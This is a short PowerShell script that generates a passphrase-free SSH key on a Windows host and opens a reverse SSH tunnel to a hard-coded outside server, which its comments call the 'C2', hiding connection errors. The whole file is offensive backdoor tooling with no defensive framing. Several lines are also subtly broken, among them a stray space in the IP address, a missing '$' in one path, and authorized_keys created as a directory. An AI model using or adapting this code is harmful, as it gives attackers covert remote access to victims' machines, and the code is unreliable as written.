$server = "198.158. 64.4";
$port = "8888";
$user = "target";

$sshDir = "$env:USERPROFILE\.ssh";
$authKeys = "$sshDir\authorized_keys";
$privateKeyPath = "$sshDir\id_rsa";
$publicKeyPath = "sshDir\id_rsa.pub";


# Check if SSH key pair exists
if (Test-Path -Path $privateKeyPath) {
        ssh -i $privateKeyPath -R $port:localhost:22 $user@$server 2>$null;

} else {

        # Check if .ssh dircotry exists, otherwise create it
        if (-not (Test-Path -Path $sshDir)) {
                New-Item -ItemType Directory -Path $sshDir -Force;
        }

        # Generate SSH key pair
        # -f -> to specify the path;
        # -N -> to omit passphrase, so accessing the private key won't prompt for the password
        # -q -> to run command in quiet mode, suppressing output messages
        ssh-keygen -t rsa -b 2048 -f $privateKeyPath -N "" -q;

        # Check if authorized_keys directory exists in order to store C2's public key for incoming connections
        if (-not (Test-Path -Path $authKeys)) {
                New-Item -ItemType Directory -Path $authKeys -Force;
        }

        # Set proper permissions?
    # icacls $sshDir /inheritance:r /grant:r "$env:USERNAME:F"
    # icacls $authKeys /inheritance:r /grant:r "$env:USERNAME:F"

        # Establish SSH connection
        # -i -> path to private key in order to omit password prompt for target authentication
        # $port -> listening port on C2
        # 2>$null -> discard any connection errors
        ssh -i $privateKeyPath -R $port:localhost:22 $user@$server 2>$null;
}
